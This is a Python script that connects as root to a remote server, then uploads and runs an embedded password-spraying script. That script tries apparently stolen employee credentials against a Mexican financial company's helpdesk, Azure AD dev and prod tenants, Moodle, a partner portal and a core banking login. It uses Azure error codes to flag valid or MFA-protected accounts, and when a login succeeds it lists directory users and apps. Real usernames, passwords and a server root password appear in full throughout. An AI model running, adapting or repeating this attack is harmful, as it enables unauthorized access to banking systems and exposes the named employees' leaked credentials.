import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


# ========================================
# 1. FOOTPRINTS — Pao1234+ AND NEW CREDS
# ========================================
sys.stdout.write("=" * 60 + "\n=== FOOTPRINTS (PAO) — NEW PASSWORDS ===\n" + "=" * 60 + "\n\n")

fp_creds = [
    # The PAO-specific password!
    ("admin", "Pao1234+"),
    ("admin@findep.global", "Pao1234+"),
    ("administrator", "Pao1234+"),
    ("bmendezar", "Pao1234+"),
    ("bmendezar", "B3nj42021#"),
    ("bmendezar", "B3nj4m1na*"),
    ("bmendezar", "m3nD3zAr#241226"),
    ("bmendezar@findep.com.mx", "Pao1234+"),
    ("hgarciaar", "Pao1234+"),
    ("hgarciaar", "Hgarcia1994*"),
    ("hgarciaar", "Quj577091"),
    ("mmartinez", "my08wjv2"),
    ("mmartinez", "v@4guyn7su8b5"),
    ("afigueroac", "Pao1234+"),
    ("afigueroac", "AFI2022*"),
    ("afigueroac", "afigueroac"),
    ("jsanchezfern", "Pao1234+"),
    ("aguzmango", "Pao1234+"),
    ("aguzmango", "Capacita-1"),  # Already works in Moodle, try in FP
]

baseline_size = None
for user, pwd in fp_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        r = s.post("https://pao.findep.com.mx/MRcgi/MRlogin.pl",
            data={"USER": user, "PASSWORD": pwd, "USERID": user,
                  "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
            timeout=10, allow_redirects=False)
        
        if baseline_size is None:
            baseline_size = len(r.text)
        
        diff = len(r.text) - baseline_size
        tag = ""
        cookies_present = bool(dict(s.cookies))
        
        if r.status_code in [302, 301]:
            loc = r.headers.get("Location", "")
            tag = f"*** REDIRECT *** -> {loc[:60]}"
        elif abs(diff) > 300:
            tag = f"SIZE DIFF {diff:+d} !!!"
        
        if cookies_present:
            cks = dict(s.cookies)
            tag += f" COOKIES: {cks}"
        
        sys.stdout.write(f"  [{r.status_code}] ({len(r.text)}b, diff={diff:+d}) {user}:{pwd} {tag}\n")
        
        # If login success, explore
        if r.status_code in [302, 301] or abs(diff) > 500:
            sys.stdout.write(f"\n*** POSSIBLE FOOTPRINTS LOGIN ***\n")
            # Follow redirect
            if r.status_code in [302, 301]:
                r2 = s.get(r.headers["Location"], timeout=10)
                sys.stdout.write(f"  Redirect page: [{r2.status_code}] ({len(r2.text)}b)\n")
                sys.stdout.write(f"  Preview: {r2.text[:500]}\n\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 2. AZURE AD DEV — bmendezar + hgarciaar
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== AZURE AD DEV — NEW USERS ===\n" + "=" * 60 + "\n\n")

TENANT_DEV = "d37bcda5-7136-468e-a984-4a47aa1468aa"
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT_DEV}/oauth2/v2.0/token"

azure_dev_creds = [
    ("bmendezar@findep.dev", "m3nD3zAr#241226"),
    ("bmendezar@findep.dev", "B3nj42021#"),
    ("bmendezar@findep.dev", "B3nj4m1na*"),
    ("bmendezar@findep.dev", "Findep2021"),
    ("bmendezar@findep.dev", "B3NJ4M1N12"),
    ("bmendezar@findep.dev", "mendez"),
    ("hgarciaar@findep.dev", "Hgarcia1994*"),
    ("hgarciaar@findep.dev", "Quj577091"),
    ("hgarciaar@findep.dev", "Hgarcia2024*"),
    ("hgarciaar@findep.dev", "Hgarcia2025*"),
    ("hgarciaar@findep.dev", "Hgarcia2026*"),
]

for email, pwd in azure_dev_creds:
    try:
        r = requests.post(TOKEN_URL,
            data={
                "grant_type": "password",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
                "scope": "https://graph.microsoft.com/.default",
                "username": email,
                "password": pwd,
            },
            timeout=10)
        
        data = r.json()
        
        if "access_token" in data:
            sys.stdout.write(f"\n*** AZURE AD DEV LOGIN SUCCESS ***\n")
            sys.stdout.write(f"  {email} : {pwd}\n")
            sys.stdout.write(f"  Token: {data['access_token'][:100]}...\n")
            
            token = data["access_token"]
            
            # Get me
            r_me = requests.get("https://graph.microsoft.com/v1.0/me",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_me.status_code == 200:
                me = r_me.json()
                sys.stdout.write(f"  Name: {me.get('displayName')}\n")
                sys.stdout.write(f"  Job: {me.get('jobTitle')}\n")
                sys.stdout.write(f"  UPN: {me.get('userPrincipalName')}\n")
            
            # List users
            r_users = requests.get("https://graph.microsoft.com/v1.0/users?$top=50",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_users.status_code == 200:
                users = r_users.json().get("value", [])
                sys.stdout.write(f"\n  Users in DEV tenant ({len(users)}):\n")
                for u in users:
                    sys.stdout.write(f"    {u.get('userPrincipalName')} | {u.get('displayName')} | {u.get('jobTitle', '-')}\n")
            
            # List apps
            r_apps = requests.get("https://graph.microsoft.com/v1.0/applications?$top=30",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_apps.status_code == 200:
                apps = r_apps.json().get("value", [])
                sys.stdout.write(f"\n  Apps ({len(apps)}):\n")
                for a in apps:
                    sys.stdout.write(f"    {a.get('displayName')} | {a.get('appId')}\n")
            
            break
        else:
            error = data.get("error_description", "")[:120]
            aadsts = re.search(r'AADSTS(\d+)', error)
            code = aadsts.group(0) if aadsts else "?"
            
            tag = ""
            if "50053" in str(code):
                tag = " *** LOCKED ***"
            elif "50076" in str(code) or "50079" in str(code):
                tag = " *** MFA REQUIRED = VALID ***"
            elif "53003" in str(code):
                tag = " *** CONDITIONAL ACCESS = VALID ***"
            elif "50055" in str(code):
                tag = " *** PASSWORD EXPIRED = VALID ***"
            elif "50034" in str(code):
                tag = " NOT_FOUND"
            elif "50126" in str(code):
                tag = " WRONG_PWD"
            
            sys.stdout.write(f"  [{code}] {email}:{pwd[:15]}...{tag}\n")
            
            if "VALID" in tag or "LOCKED" in tag:
                sys.stdout.write(f"  !!! {tag} !!!\n")
                if "LOCKED" in tag:
                    break
    except Exception as e:
        sys.stdout.write(f"  ERR: {str(e)[:60]}\n")
    
    time.sleep(1.5)
    sys.stdout.flush()


# ========================================
# 3. AZURE AD PROD — bmendezar@findep.com.mx
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== AZURE AD PROD — bmendezar ===\n" + "=" * 60 + "\n\n")

TENANT_PROD = "c5306fea-e13c-419e-adbe-e642c502de26"
TOKEN_URL_PROD = f"https://login.microsoftonline.com/{TENANT_PROD}/oauth2/v2.0/token"

prod_creds = [
    ("bmendezar@findep.com.mx", "B3nj42021#"),
    ("bmendezar@findep.com.mx", "B3nj4m1na*"),
    ("bmendezar@findep.com.mx", "m3nD3zAr#241226"),
    ("bmendezar@findep.com.mx", "Findep2021"),
    ("bmendezar@findep.com.mx", "B3NJ4M1N12"),
    ("bmendezar@findep.com.mx", "1234"),
    ("hgarciaar@findep.com.mx", "Hgarcia1994*"),
    ("hgarciaar@findep.com.mx", "Quj577091"),
]

for email, pwd in prod_creds:
    try:
        r = requests.post(TOKEN_URL_PROD,
            data={
                "grant_type": "password",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
                "scope": "https://graph.microsoft.com/.default",
                "username": email,
                "password": pwd,
            },
            timeout=10)
        
        data = r.json()
        
        if "access_token" in data:
            sys.stdout.write(f"\n*** AZURE AD PROD LOGIN ***\n")
            sys.stdout.write(f"  {email} : {pwd}\n")
            sys.stdout.write(f"  Token: {data['access_token'][:80]}...\n")
            break
        else:
            error = data.get("error_description", "")[:120]
            aadsts = re.search(r'AADSTS(\d+)', error)
            code = aadsts.group(0) if aadsts else "?"
            
            tag = ""
            if "50053" in str(code):
                tag = " *** LOCKED ***"
            elif "50076" in str(code) or "50079" in str(code):
                tag = " *** MFA = VALID ***"
            elif "53003" in str(code):
                tag = " *** CA = VALID ***"
            elif "50055" in str(code):
                tag = " *** EXPIRED = VALID ***"
            elif "50034" in str(code):
                tag = " NOT_FOUND"
            elif "50126" in str(code):
                tag = " WRONG_PWD"
            
            sys.stdout.write(f"  [{code}] {email}:{pwd[:15]}...{tag}\n")
            
            if "LOCKED" in tag:
                break
    except:
        pass
    time.sleep(1.5)
    sys.stdout.flush()


# ========================================
# 4. MOODLE — NEW CREDS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== MOODLE — NEW STEALER CREDS ===\n" + "=" * 60 + "\n\n")

MOODLE = "https://universidad.findep.mx"

moodle_creds = [
    ("bmendezar", "Findep2021"),
    ("bmendezar", "B3nj42021#"),
    ("bmendezar", "B3nj4m1na*"),
    ("bmendezar", "m3nD3zAr#241226"),
    ("bmendezar", "1234"),
    ("bmendezar", "mendez"),
    ("bmendezar@findep.com.mx", "B3nj42021#"),
    ("bmendezar@findep.dev", "m3nD3zAr#241226"),
    ("hgarciaar", "Hgarcia1994*"),
    ("hgarciaar", "Quj577091"),
    ("hgarciaar@findep.dev", "Hgarcia1994*"),
    ("afigueroac", "afigueroac"),
    ("afigueroac", "Pao1234+"),
    ("afigueroac", "AFI2022*"),
]

for user, pwd in moodle_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        r0 = s.get(f"{MOODLE}/login/index.php", timeout=10)
        lt = re.search(r'name="logintoken"\s+value="([^"]+)"', r0.text)
        
        r = s.post(f"{MOODLE}/login/index.php",
            data={"username": user, "password": pwd,
                  "logintoken": lt.group(1) if lt else ""},
            timeout=10, allow_redirects=True)
        
        # Verify by checking /my/
        r_my = s.get(f"{MOODLE}/my/", timeout=10)
        is_dash = "Tablero" in r_my.text or "Dashboard" in r_my.text or "loggedinas" in r_my.text
        
        if is_dash:
            sys.stdout.write(f"  *** MOODLE LOGIN *** {user}:{pwd}\n")
            
            # Check if admin
            r_admin = s.get(f"{MOODLE}/admin/index.php", timeout=10)
            is_admin = "admin" not in r_admin.url or "Tablero" in r_admin.text[:3000]
            sys.stdout.write(f"    Admin access: {is_admin}\n")
        else:
            sys.stdout.write(f"  FAIL {user}:{pwd[:15]}...\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 5. PPP KHOR — NEW CREDS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== PPP KHOR — NEW CREDS ===\n" + "=" * 60 + "\n\n")

ppp_creds = [
    ("bmendezar@findep.com.mx", "1234"),
    ("bmendezar@findep.com.mx", "B3nj42021#"),
    ("bmendezar@findep.com.mx", "B3nj4m1na*"),
    ("bmendezar", "1234"),
    ("bmendezar", "B3nj42021#"),
    ("hgarciaar", "Hgarcia1994*"),
    ("hgarciaar", "Quj577091"),
    ("afigueroac", "afigueroac"),
    ("afigueroac", "Pao1234+"),
    ("admin", "Pao1234+"),
]

for user, pwd in ppp_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        r0 = s.get("https://ppp.findep.mx/", timeout=10)
        csrf = re.search(r'name="CSRFToken"\s+value="([^"]+)"', r0.text)
        
        s.post("https://ppp.findep.mx/", data={"modo": "user"}, timeout=10)
        
        r = s.post("https://ppp.findep.mx/",
            data={"usr": user, "pwd": pwd, "modo": "user",
                  "CSRFToken": csrf.group(1) if csrf else "", "embedded": "0"},
            timeout=10, allow_redirects=False)
        
        loc = r.headers.get("Location", "")
        if r.status_code in [302, 301] and "login" not in loc.lower() and loc != "/":
            sys.stdout.write(f"  *** PPP LOGIN *** [{r.status_code}] {user}:{pwd} -> {loc}\n")
        else:
            sys.stdout.write(f"  [{r.status_code}] {user}:{pwd[:10]}... -> {loc[:40]} (fail)\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 6. CORE BANKING — NEW CREDS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CORE BANKING — NEW CREDS ===\n" + "=" * 60 + "\n\n")

core_creds = [
    ("bmendezar", "B3nj42021#"),
    ("bmendezar", "B3nj4m1na*"),
    ("bmendezar", "Pao1234+"),
    ("bmendezar", "1234"),
    ("bmendezar", "mendez"),
    ("hgarciaar", "Hgarcia1994*"),
    ("hgarciaar", "Quj577091"),
    ("afigueroac", "afigueroac"),
    ("afigueroac", "Pao1234+"),
    ("admin", "Pao1234+"),
]

for user, pwd in core_creds:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        
        r = s.post("https://core.findep.mx/valida.do",
            data={"cveUsr": user, "msjPass": pwd, "cve_idToken": ""},
            timeout=10, allow_redirects=False)
        
        if r.status_code in [302, 301]:
            loc = r.headers.get("Location", "")
            if "principal" in loc.lower() or "menu" in loc.lower() or "inicio" in loc.lower():
                sys.stdout.write(f"  *** CORE LOGIN *** {user}:{pwd} -> {loc}\n")
            else:
                sys.stdout.write(f"  [{r.status_code}] {user}:{pwd[:10]}... -> {loc[:40]}\n")
        elif r.status_code == 200 and len(r.text) != 9907:
            sys.stdout.write(f"  [{r.status_code}] ({len(r.text)}b) {user}:{pwd[:10]}... SIZE DIFF!\n")
    except:
        pass
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_stealer_deep_spray.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_stealer_deep_spray.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
